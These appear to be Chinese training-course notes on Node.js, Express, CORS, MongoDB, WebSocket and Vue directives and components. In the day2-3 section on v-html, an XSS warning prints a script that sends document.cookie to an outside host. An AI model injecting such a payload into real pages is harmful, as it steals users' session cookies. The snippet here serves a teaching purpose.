# NodeJS
Nodejs是2009由Ryan Dahl推出的运行在服务端的 JavaScript（类似于java,php,python,.net等服务端语言）,
基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。

## day1-2
* 环境
    * nodejs: 10.16.0 / 14.15.4
    * npm: nodejs package management
    * 环境变量
* 模块化开发
    > 模块的作用域为局部作用域
    * 优点
        * 分工
        * 维护
        * 复用
    * 规范
        * commonJS      nodeJS支持的规范（后端）
        * ESModule      ES6模块化（前端）
        * AMD           require.js（前端）
        * CMD           sea.js（前端）
* javascript
    * 前端javascript = ECMAScript + BOM + DOM
        > 在浏览器中运行
    * 后端NodeJS: ECMAScript + 后端概念
        > 在命令行中运行，没有BOM与DOM的概念
* nodeJS多版本共存工具：nvm
    * nvm list  查看已安装nodeJS的版本
    * nvm use   切换nodeJS版本
    * nvm install   安装nodeJS版本
    * nvm uninstall 卸载nodeJS版本
* 运行nodeJS代码
    * REPL：交互式解释器，一般用于测试代码
    * 运行文件： node xxx.js

* commonJS
    * 使用
        > nodeJS把一个文件当作一个模块，都为**局部作用域**，如果想在一个模块中使用另外一个模块的数据，则需要导入导出
        * 导出：
            * `exports`
            * `module.exports`    （推荐）
        * 导入：`require()`
            > 引入模块会自动缓存
            * 引入模块的步骤
                1. 从缓存中引入
                2. 从原生模块引入
                3. 从`node_modules`中引入
                    * package.json
                        * main
                4. 缓存模块

    * 模块分类
        * 内置模块：nodejs自带的模块，可以直接引入，不需要加路径
        * 自定义模块：自己编写的模块，引入时需要添加相对路径
        * 第三方模块: 别人写人模块
            1. 安装：
                * npm install xxx
                * cnpm
                * yarn: 
                    * `yarn add xxx`
                    * `yarn add global xxx`
            2. 引入: 与原生模块一致
* 利用node实现http服务器
    * 请求：request
        > 客户端发给服务器
    * 响应：response
        > 服务器返回给客户端
    * 静态资源
        > html,css,js,img,font,svg....等内容称为静态资源，用来显示这些静态资源的服务器称为静态资源服务器
    * 服务器实现步骤
        * 依赖模块：
            * http
            * fs
                * fs.readFile()/fs.readFileSync()
* nodeJS模块变量
    * __dirname 当前文件所在的路径
    * __filename

## day1-3

### 复习
* 模块化开发
    * 规范
        * commonJS      NodeJS（后端，同步）
        * ESModule      ES6（前端）
            * 导出：export
            * 导入：import
        * AMD           require.js（前端，异步）
        * CMD           sea.js（前端，异步）
            * 导出：define()
            * 导入：require()
    * 分类
        * 内置模块
        * 自定义模块
        * 第三方模块
    * 使用
        * 导出
            * module.exports
            * exports
        * 导入: require()
* nodeJS多版本共存工具：nvm
    * `nvm install [version]`
    * `nvm uninstall [version]`
    * `nvm list`
    * `nvm use [version]`
* http服务器
    > 特点：http(s)请求客户端主动发起，服务器被动响应
    * 请求request
    * 响应response
    * 依赖模块
        * http
        * path
        * fs
        * url
    * mime类型

### 知识点
* express -> Koa
    * express实现静态资源服务器
    ```js
        server.use(express.static('../public'))
    ```
    * express中间件：middleware
        > express中间件是一个函数
        * 分类：
            * 内置中间件
                * express.static()  静态资源服务器中间件
            * 自定义中间件
            * 第三方中间件
        * 使用中间件
            * `use([path],mw1,mw2,mw3....,mwn)`
                * path: 只有路径匹配才进入后面的中间件，如果没有配置path路径则所有请求都进入这个中间件
            * next(): 调用next才能进入下一个中间件
* 利用express中间件实现数据接口
    * 规范：RESTful API
        * 根据请求类型和路径实现不同的接口
    * 请求类型
        * get           查
        * post          增
        * put/patch     改
        * delete        删
    * 获取前端传入参数
        * get请求：通过url参数传到后端，后端通过`req.query`获取
        * 动态路由：后端通过`req.params`获取
        * post/put/patch/delete请求：通过请求体传到后端，后端通过`req.body`获取
            > 利用中间处理不同数据类型:body-parser
            * urlencoded: express.urlencoded
            * json:       express.json()
    * 利用模块化开发思想+路由中间件实现数据接口
        * commonJS
        * express.Router()
## day1-4

### 复习
* express(koa)
    * 中间件middleware
        * 内置中间件
            * express.static()  静态资源服务器
            * express.urlencoded()  处理请求体数据，并格式化到req.body
            * express.json()        处理json数据，并格式化到req.body
            * express.raw()
            * express.Router()      实现模块化路由
        * 自定义中间件
        * 第三方中间件
            * body-parser
    * 使用：use(path,...middleware)
* 路由
    * 数据接口（RESTful API）
        > 利用请求类型与路径实现不同的数据接口
    * 模块化路由
    * 请求类型
        * get       查
        * post      增
        * put/patch 改
        * delete    删
### 知识点
* 图片上传
    * 后端：multer
        * single(field)             单个上传，接收到的文件存入req.file
        * array(field,maxCount)     多个上传，接收到的文件存入req.files
    * 前端：FormData
        * content-type:multipart/form-data
        * set(key,val)
        * append(key,val)
        * get(key)
        * getAll(key)
        * forEach()
        * has()
        * keys()
        * values()
* 跨域
    * 产生跨域的条件：协议、域名、端口三者不一致
    * 为什么会有跨域限制：因为js是一门**客户端脚本语言**（在客户端执行的语言）
    * 跨域解决方案
        * jsonp
            * 原理：利用script标签没有跨域限制的特点来发起请求,返回一段js代码的执行（全局函数的执行代码）
            * 步骤
                1. 定义全局函数
                2. script标签发起请求，传递全局函数名
                3. 删除script，全局函数
        * CORS（推荐）
            * 响应头
                * Access-Control-Allow-Origin
                    * 一个域名
                    * `*`
                * Access-Control-Allow-Methods
                * Access-Control-Allow-Headers
            * 复杂跨域
                * 非GET、HEAD、POST请求。
                * POST请求的Content-Type不是application/x-www-form-urlencoded, multipart/form-data, 或text/plain。
                * 添加了自定义header，例如Token。
        * 服务器代理
            * 原理：利用服务端没有跨域限制的特点在后端向目标服务器发起请求，得到结果后响应给前端
        * 爬虫
            * 原理：爬取目标服务器的所有信息，然后分析过滤得到最终数据
* 页面渲染方式
    * 服务器渲染SSR：html结构在服务器生成并响应给前端，并渲染页面
        > 特点：速度快，SEO友好
        * 步骤
            1. 请求服务器，响应完整的html结构
            2. 浏览器渲染页面
    * 客户端渲染BSR：从服务器请求数据到客户端生成html结构，并渲染到页面
        > 特点：用户体验较好，局部刷新
        * 步骤
            1. 请求服务器，响应一个空的html结构
            2. 浏览器渲染页面，并请求js
            3. 执行js代码，并发起ajax请求
            4. 接收到数据，在客户端生成html结构
            5. 渲染页面
* fs模块
    * 小文件：
        * 读取：fs.readFile()/fs.readFileSync()
        * 写入：fs.writeFile()/fs.writeFileSync()
    * 大文件：Stream
        * 读取流：fs.createReadStream(path)
        * 写入流：fs.createWriteStream(path)

## day1-5

### 复习
* 图片上传
    * FormData
    * multer
* 跨域解决方案
    * jsonp
    * CORS
    * Proxy
    * 爬虫
        * request
        * cheerio
        * 图片：爬取到本地
        * json: 存入本地json
            * fs.writeFile()

### 知识点
* 数据库
    * mySQL
        * 增：insert into
        * 删：delete from 
        * 改：update set
        * 查：select from 
    * MongoDB
        * 增：
            * insertOne(document)
            * insertmany([...document])
        * 删：
            * deleteOne(query)
            * deleteMany(query)
        * 改：
            * updateOne(query,data)
            * updataMany(query,data)
            * save(document)
            ```js
                db.user.updateOne(
                    {username:'laoxie'},
                    {
                        $set:{password:123654,gender:'male'}
                    }
                )
                db.goods.updateOne(
                    {_id:xxx},
                    {
                        // 在原值基础上+1
                        $inc:{hot:1}
                    }
                )
            ```
        * 查: 
            * find(query)
            * findOne(query)

    数据类型     数据库          表/集合          数据
    mySQL       database        table            row
    mongoDB     database        collection       document

    ```js
        [
            {name:'goods1',price:998,sale_price:98},
            {name:'goods2',price:1998,imgurl:'goods2.png',addtime:324597234}
        ]
    ```
* 在Node中使用mySQL
    * 驱动：mysql模块
        * 连接对象
        * 连接池
* 在Node中使用mongodb
    * 驱动：mongodb/mongoose
    * 增删该查的封装

* 项目验收
* 提交最新代码到github
* 上线
* 发邮件
    * 发老谢：xiejinrong@1000phone.com
    * 抄小谢：xiedongling@1000phone.com

    * 邮件内容
        * 原网站地址
        * 上线地址
        * github地址
        * 页面介绍
            * 首页
            * 购物车
            * 注册
            * 登录
        * 截图：至少3张
        * 录视频
* 提交项目到：http://manage.qfh5.cn/

## day2-1

### 复习
* MongoDB CRUD
    * 增：
        * insertOne(document)
        * insertMany([document,...])
    * 删
        * deleteOne(query)
        * deleteMany(query)
    * 改
        * updateOne(query,data)
        * updateMany(query,data)
        * save(document)
        * 修改操作符
            * $set: 修改
            * $inc: 递增
            * $push: 追加
            * $addToSet：添加（自动去重）
            * ...
    * 查
        * find(query)
        * findOne(query)

* 在NodeJS中使用Mongo
    * 驱动：mongodb模块

### 知识点
* http/https特点
    * 短链接：请求并响应完成，连接就会断开
    * 客户端主动，服务器被动
        * 客户端不断发请求：轮询
* WebSocket
    > HTML新特性
    * 长连接：与服务器建立连接后不会断开
    * 客户端
        * 浏览器是否支持WebSocket
        * 方法
            * send()：向服务端推送消息
            * close(): 在客户端断开与服务端的连接
        * 事件
            * open
        ```js
            var socket = new WebSocket('ws://localhost:1001');

            // 客户端向服务器发送消息
            socket.send('hello')
        ```
    * 服务器
        > 依赖模块：ws，能主动发起请求
        * 方法
            * send()    向客户端发送消息
        * 事件
            * connection
        ```js
            const server = new ws.Server({
                port:1001
            });
        ```
    * 应用：多人聊天室（微信群等）
        1. 某个客户端发送消息到服务器
            > 客户端主动
        2. 服务器把消息广播给所有客户端
            > 服务器主动


## day2-2

### 面试题
* 移动端click事件穿透bug
    * 移动端click事件有300ms左右延迟
    * touch
        * touchstart
        * touchend
        * touchmove
    * zepto.js手势
        * tap
        * longtap
        * swiper,swiperLeft,swiperRight,swiperUp,swiperDown

### 知识点
* Vue
    * 思维转变(重要)
        * 从**节点操作**转变成**数据操作**
        * 把节点操作交给Vue框架去处理
    * 数据绑定
        * 单向绑定
            * {{}}
            * v-text
            * v-html
            * v-bind:attr    绑定到属性
        * 双向绑定
            * v-model
                * 数据层->视图层: setter
                * 视图层->数据层: 事件
            * v-model的原理：单向绑定(v-bind)+事件(v-on)
            ```js
                <input type="text" v-model="username" />
                <input type="text" v-bind:value="username" v-on:input="username=$event.target.value">
            ```
    * 指令（html属性）
        * v-model   双向绑定
        * v-text    单向绑定
        * v-html    单向绑定
        * v-bind    属性绑定
        * v-on      事件绑定
        * v-for     遍历
        * v-show    是否显示（显示隐藏）
            > 频繁显示隐藏建议使用v-show
        * v-if      是否显示（节点创建与销毁）
            * v-else-if
            * v-else
* 架构模式
    * MVC
        > 耦合度高
        * Model         数据层
        * View          视图层
        * Controller    控制层
    * MVP
        * Model
        * View
        * Presenter     
    * MVVM
        * Model
        * View
        * ViewModel     
* 响应式属性
    > 特点：监听数据的修改，并自动更新视图
    * 原理：存储器属性getter&setter
    * 在Vue中如何设置响应式属性
        * 设置初始值
        * Vue.set(target,key,val)/this.$set(): 给target添加响应式属性
            > target不能是vue实例和data根数据对象

* 属性特性
    * 值属性（有值的属性）
        * configurable  可配置型
        * enumerable    可枚举性
        * writable      可写性
        * value
    * 存储器属性：属性本身没有值，但可以监听到修改与读取，一般用于代理其他数据
        * configurable 
        * enumerable
        * get
        * set

## day2-3

### 复习
* 响应式属性
    * 核心：存储器属性getter&setter
    * 设置存储器属性的方式
        * data: 实例化Vue时，会遍历data下所有属性，并把它们转成存储器属性
        * Vue.set()/this.$set
* 双向：v-model
    * 单向: v-bind:value
    * 事件
* 指令
    * v-text
    * v-html    慎用，防止xss攻击（过滤破坏性代码），除非你信任数据内容
        ```js
            <script>
                location.href = 'http://laoxie.com?cookie='+document.cookie
            </script>
        ```
    * v-bind
        > 简写： :
    * v-model
    * v-for
    * v-on
        > 简写：@
    * v-show
    * v-if
        * v-else-if
        * v-else


### 知识点
* computed: 计算属性
    > 核心：getter & setter
* 实例属性&方法
    * this.$refs: 保存所有ref属性对应的节点
    * this.$el: 实例化时配置的el（视图对应的节点）
    * this.$data: 实例化时配置的data
    * this.$options: 实例化时的所有配置信息
    * this.$set()/Vue.set()
    * this.$delete()/Vue.delete()
* 事件
    * event
        * 默认为事件处理函数的第一个参数
        * 如果手动传参，需要手动传递event对象
    * 传参
    * 修饰符：
        * 键盘事件修饰符
            * 复制：@keyup.ctrl.67
        * 鼠标事件修饰符
* 过滤器filter
    * 定义
        * 全局过滤器：Vue.filter(name,definition)
        * 局部过滤器: filters
    * 使用：|
        * {{}}
        * v-bind
    * 练习
        * 1000000 -> 1,000,000

## day2-4

### 复习
* computed：计算属性
    > 本质为存储器属性getter&setter
    * 特点：自动缓存，只有在computed属性依赖的数据发生改变时才会重新执行里面的代码，否则从缓存中读取
    ```js
        computed:{
            checkAll(){},
            checkAll:{
                get(){},
                set(){}
            }
        }
    ```
* 实例属性&方法
    * $el
    * $data
    * $refs
    * $options
    * $props
    * $attr
    ```js
        new Vue({
            ...
        })
    ```
    * $set()/Vue.set()
    * $delete()/Vue.delete()
* 全局方法（Vue静态方法）
    * Vue.set()
    * Vue.delete()
    * Vue.filter()
* 事件
    > 事件绑定完整格式：v-on:事件类型.修饰符="事件处理函数"
    * 绑定：v-on, @
    * event
        * 默认事件处理函数的第一个参数
        * 如果传参，则需手动传递$event
    * 传参
        ```js
            <button @click="change"></button>
            <button @click="change(id,$event)"></button>
        ```
    * 修饰符
        * 键盘事件修饰符
        * 鼠标事件修饰符
* 过滤器
    * 定义
        * 全局  Vue.filter(name,definition)
            * definition是一个函数，第一个参数为待过滤的值，后面的为过滤器参数（可选）
        * 局部  filters
    * 使用：|
        > 可以同时使用多个过滤器
        * 在{{}}中使用
        * 在v-bind中使用

### day2-4
* 组件化开发
    > 封装、模块化
    * 优点
        * 分工更容易
        * 维护更方便
        * 复用
    * 定义
        > 组件就是Vue实例（定义一个组件可以理解为创建一个标签）
        * 全局组件: Vue.component(name,options)
        * 局部组件: components:{name1:options,name2:options}
    * 使用
        ```js
            <组件名/>
            <组件名></组件名>
        ```
    * 配置参数
        * el        视图属性，组件配置没有
        * template  模板属性
        * render    渲染方法
    * 组件通讯
        * 父->子：props
            1. 父组件操作：给子组件定义属性并传递数据
            2. 子组件操作：
                1. props接收数据，接收的数据会自动称为实例的属性
                    > 注意大小写问题
                    * 如果不接收，则props属性自动成为组件根元素的属性
                    * props数据类型校验
                        * 类型
                        * 必填
                        * 默认值
                2. 在组件中通过this.xxx使用
        * 子->父
            1. 父组件操作：给子组件自定义事件，并传递父组件的方法作为事件处理函数
                > v-on:事件="父组件方法"
            2. 子组件操作：子组件通过`this.$emit(type,data)`触发自定义事件

* 模块化开发todolist
    1. 划分组件
    2. 定义组件
    3. 组件通讯
        * 父->子：props
        * 子->父：
            * 自定义事件
            * 把父组件函数传到子组件执行
        * 多层级组件
            * 逐层传递（不推荐）
            * Bus事件总线
                1. 定义一个父组件和子组件都能访问到的Vue实例
                2. 接收方给Bus绑定事件，事件处理函数为接收方的方法
                    > Bus.$on()
                3. 发送方触发Bus事件，并传递参数
                    > Bus.$emit()

## day2-5

### 知识点
* key
    > key一定是**唯一**且**稳定**的值
    * 在Vue中，为了提高页面性能，Vue会尽量较少节点操作（对比节点的前后状态，过滤掉一些没必要的节点操作(找出差异项)）
        * 如过Vue无法判断前后节点的对应状态，为了提升性能，采用**复用原则**（不对节点进行创建与销毁，而是改变它的内容）
        * diff算法
            * 虚拟节点（VirtualDOM）：一个结构类似于真实DOM节点的js对象
            ```js
            // 初始状态
                {
                    type:'p',
                    props:{},
                    children:[{
                        type:'span',
                        props:{},
                        children:'laoxie',
                        key:11
                    },{
                        type:'strong',
                        props:{},
                        children:'xxx'
                        key:12
                    }]
                    key:1
                }

                // 结束状态
                {
                    type:'p',
                    props:{},
                    children:[{
                        type:'span',
                        props:{},
                        children:'tiantian'
                        key:11
                    },{
                        type:'strong',
                        props:{},
                        children:'xxx'
                        key:12
                    }]
                    //key:1
                }
            ```
